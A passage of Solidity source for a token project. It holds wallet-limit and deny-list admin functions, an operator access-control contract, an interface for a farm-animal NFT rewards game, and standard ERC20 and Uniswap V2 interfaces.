    // It will just prevent transferring / buys to be made for them
    maxTokenPerWalletPercent = _maxTokenPerWalletPercent;
    require(
      getMaxTokenPerWallet() >= timeframeQuotaIn,
      "WalletObserverUpgradeable: Max token per wallet must be above or equal to timeframeQuotaIn"
    );
  }

  function setTimeframeExpiresAfter(
    uint256 _timeframeExpiresAfter
  ) public onlyOperator {
    require(
      _timeframeExpiresAfter > 0,
      "WalletObserverUpgradeable: Timeframe expiration cannot be 0"
    );
    timeframeExpiresAfter = _timeframeExpiresAfter;
  }

  function setTimeframeQuotaIn(uint256 _timeframeQuotaIn) public onlyOperator {
    require(
      _timeframeQuotaIn > 0,
      "WalletObserverUpgradeable: Timeframe token quota in cannot be 0"
    );
    timeframeQuotaIn = _timeframeQuotaIn;
  }

  function setTimeframeQuotaOut(
    uint256 _timeframeQuotaOut
  ) public onlyOperator {
    require(
      _timeframeQuotaOut > 0,
      "WalletObserverUpgradeable: Timeframe token quota out cannot be 0"
    );
    timeframeQuotaOut = _timeframeQuotaOut;
  }

  function denyMalicious(address account, bool status) external onlyOperator {
    _isDenied[account] = status;
  }

  function excludeFromObserver(
    address account,
    bool status
  ) public onlyOperator {
    _isExcludedFromObserver[account] = status;
  }

  function totalSupply() external view returns (uint256) {
    uint256 _totalSupply = butcherToken.totalSupply();

    // Ignore Treasury wallets
    _totalSupply -= butcherToken.balanceOf(
      0x8884E46A87255Dd90b8F08B245a3aAd108E2AF79 // Multi-sig
    );
    _totalSupply -= butcherToken.balanceOf(
      0x747218E40fF47bE6869d7Ea3BDc74ae879dac7c4 // Marketing
    );
    _totalSupply -= butcherToken.balanceOf(
      0x1acC825C922BBC9c6e4c03ECD929Bc8f73F9e363 // Donations
    );
    _totalSupply -= butcherToken.balanceOf(
      0x070b2b1F138FdEC6D6Cb3c47d8A74D5715c26Abf // Dev
    );
    _totalSupply -= butcherToken.balanceOf(
      0x20e5D2308F560060C7eC1a8454774209D9Bf1F31 // Treasury Invest
    );

    return _totalSupply;
  }
}
pragma solidity ^0.8.0;

contract Operator {
  mapping(address => bool) internal _operators;

  constructor() {
    _operators[msg.sender] = true;
  }

  modifier onlyOperator() {
    require(_operators[msg.sender] == true, "Not operator");
    _;
  }

  function setOperator(address _user, bool _value) external onlyOperator {
    _operators[_user] = _value;
  }
}
pragma solidity >=0.5.0;

interface IERC20 {
  event Approval(address indexed owner, address indexed spender, uint value);
  event Transfer(address indexed from, address indexed to, uint value);

  function name() external view returns (string memory);

  function symbol() external view returns (string memory);

  function decimals() external view returns (uint8);

  function totalSupply() external view returns (uint);

  function balanceOf(address owner) external view returns (uint);

  function allowance(
    address owner,
    address spender
  ) external view returns (uint);

  function approve(address spender, uint value) external returns (bool);

  function transfer(address to, uint value) external returns (bool);

  function transferFrom(
    address from,
    address to,
    uint value
  ) external returns (bool);
}
interface IEntityManager {
  function approve(address to, uint256 tokenId) external;

  function balanceOf(address owner) external view returns (uint256);

  function calculateRewards(uint256 _entityId) external view returns (uint256);

  function createEntity(
    uint256 _type,
    string memory _entityName,
    address _referrer
  ) external;

  function decrement(uint256 value) external view returns (uint256);

  function getApproved(uint256 tokenId) external view returns (address);

  function getDailyReward(uint256 _entityId) external view returns (uint256);

  function getEntityIdsOf(
    address account
  ) external view returns (uint256[] memory);

  function getEntityInfo(
    uint256 _entityId
  ) external view returns (string memory, uint256, bool);

  function getEntityName(
    uint256 _entityId
  ) external view returns (string memory);

  function getEntityTypeName(
    uint256 _entityId
  ) external view returns (string memory);

  function getPercentageOf(
    uint256 value,
    uint256 percentage
  ) external view returns (uint256);

  function getTypeImageURI(
    uint256 _entityId
  ) external view returns (string memory);

  function increment(uint256 value) external view returns (uint256);

  function initialize(
    address butcher,
    address rwPool,
    address treasuryWallet
  ) external;

  function int2str(
    uint256 _i
  ) external view returns (string memory _uintAsString);

  function isApprovedForAll(
    address owner,
    address operator
  ) external view returns (bool);

  function isChickenOwner(address _user) external view returns (bool);

  function isCowOwner(address _user) external view returns (bool);

  function isEntityValid(uint256 _entityId) external view returns (bool);

  function isMooDengOwner(address _user) external view returns (bool);

  function name() external view returns (string memory);

  function ownerOf(uint256 tokenId) external view returns (address);

  function printAttributes(
    uint256 _entityId
  ) external view returns (string memory);

  function safeTransferFrom(address from, address to, uint256 tokenId) external;

  function safeTransferFrom(
    address from,
    address to,
    uint256 tokenId,
    bytes memory data
  ) external;

  function setApprovalForAll(address operator, bool approved) external;

  function setEntityType(
    uint256 _type,
    uint256 _price,
    uint256 _rewardPerSecond,
    uint256 _epochTime,
    uint256 _incubationTime,
    string memory _name,
    string memory _imageURI
  ) external;

  function setOperator(address user, bool value) external;

  function setWallets(address treasury, address rewardPool) external;

  function slaughter(uint256 _entityId) external;

  function supportsInterface(bytes4 interfaceId) external view returns (bool);

  function symbol() external view returns (string memory);

  function tokenByIndex(uint256 index) external view returns (uint256);

  function tokenOfOwnerByIndex(
    address owner,
    uint256 index
  ) external view returns (uint256);

  function tokenURI(uint256 tokenId) external view returns (string memory);

  function totalSupply() external view returns (uint256);

  function transferFrom(address from, address to, uint256 tokenId) external;
}
pragma solidity >=0.5.0;

interface IUniswapV2Pair {
  event Approval(address indexed owner, address indexed spender, uint value);
  event Transfer(address indexed from, address indexed to, uint value);

  function name() external pure returns (string memory);

  function symbol() external pure returns (string memory);

  function decimals() external pure returns (uint8);

  function totalSupply() external view returns (uint);

  function balanceOf(address owner) external view returns (uint);

  function allowance(
    address owner,
    address spender
  ) external view returns (uint);

  function approve(address spender, uint value) external returns (bool);

  function transfer(address to, uint value) external returns (bool);

  function transferFrom(
    address from,
    address to,
    uint value
  ) external returns (bool);

  function DOMAIN_SEPARATOR() external view returns (bytes32);

  function PERMIT_TYPEHASH() external pure returns (bytes32);

  function nonces(address owner) external view returns (uint);

  function permit(
    address owner,
    address spender,
    uint value,
    uint deadline,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external;

  event Mint(address indexed sender, uint amount0, uint amount1);
  event Burn(
    address indexed sender,
    uint amount0,
    uint amount1,
    address indexed to
  );
  event Swap(
    address indexed sender,
    uint amount0In,
    uint amount1In,
    uint amount0Out,
    uint amount1Out,
    address indexed to
  );
  event Sync(uint112 reserve0, uint112 reserve1);

  function MINIMUM_LIQUIDITY() external pure returns (uint);

  function factory() external view returns (address);

  function token0() external view returns (address);

  function token1() external view returns (address);

  function getReserves()
    external
    view
    returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

  function price0CumulativeLast() external view returns (uint);

  function price1CumulativeLast() external view returns (uint);

  function kLast() external view returns (uint);

  function mint(address to) external returns (uint liquidity);

  function burn(address to) external returns (uint amount0, uint amount1);

  function swap(
    uint amount0Out,
    uint amount1Out,
    address to,
    bytes calldata data
  ) external;

  function skim(address to) external;

  function sync() external;

  function initialize(address, address) external;
}
pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
  function factory() external pure returns (address);

  function WETH() external pure returns (address);

  function addLiquidity(
    address tokenA,
    address tokenB,
    uint amountADesired,
    uint amountBDesired,
    uint amountAMin,
    uint amountBMin,
    address to,
    uint deadline
  ) external returns (uint amountA, uint amountB, uint liquidity);

  function addLiquidityETH(
    address token,
    uint amountTokenDesired,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline
  ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

  function removeLiquidity(
    address tokenA,
    address tokenB,
    uint liquidity,
    uint amountAMin,
    uint amountBMin,
    address to,
    uint deadline
  ) external returns (uint amountA, uint amountB);

  function removeLiquidityETH(
    address token,
    uint liquidity,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline
  ) external returns (uint amountToken, uint amountETH);

  function removeLiquidityWithPermit(
    address tokenA,
    address tokenB,
    uint liquidity,
    uint amountAMin,
    uint amountBMin,
    address to,
    uint deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint amountA, uint amountB);

  function removeLiquidityETHWithPermit(
    address token,
    uint liquidity,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint amountToken, uint amountETH);

  function swapExactTokensForTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external returns (uint[] memory amounts);

  function swapTokensForExactTokens(
    uint amountOut,
    uint amountInMax,
    address[] calldata path,
    address to,
    uint deadline
  ) external returns (uint[] memory amounts);

  function swapExactETHForTokens(
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external payable returns (uint[] memory amounts);

  function swapTokensForExactETH(
    uint amountOut,
    uint amountInMax,
    address[] calldata path,
    address to,
    uint deadline
  ) external returns (uint[] memory amounts);

  function swapExactTokensForETH(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external returns (uint[] memory amounts);

  function swapETHForExactTokens(
    uint amountOut,
    address[] calldata path,
    address to,
    uint deadline
  ) external payable returns (uint[] memory amounts);

  function quote(
    uint amountA,
    uint reserveA,
    uint reserveB
  ) external pure returns (uint amountB);

  function getAmountOut(
    uint amountIn,
    uint reserveIn,
    uint reserveOut
  ) external pure returns (uint amountOut);

  function getAmountIn(
    uint amountOut,
    uint reserveIn,
    uint reserveOut
  ) external pure returns (uint amountIn);

  function getAmountsOut(
    uint amountIn,
    address[] calldata path
  ) external view returns (uint[] memory amounts);

  function getAmountsIn(
    uint amountOut,
    address[] calldata path
  ) external view returns (uint[] memory amounts);

  function removeLiquidityETHSupportingFeeOnTransferTokens(
    address token,
    uint liquidity,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline
  ) external returns (uint amountETH);

  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
    address token,
    uint liquidity,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint amountETH);

  function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external;

  function swapExactETHForTokensSupportingFeeOnTransferTokens(
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external payable;

  function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external;
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
  function removeLiquidityETHSupportingFeeOnTransferTokens(
    address token,
    uint liquidity,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline
  ) external returns (uint amountETH);

  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
    address token,
    uint liquidity,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint amountETH);

  function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external;

  function swapExactETHForTokensSupportingFeeOnTransferTokens(
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external payable;

  function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external;
}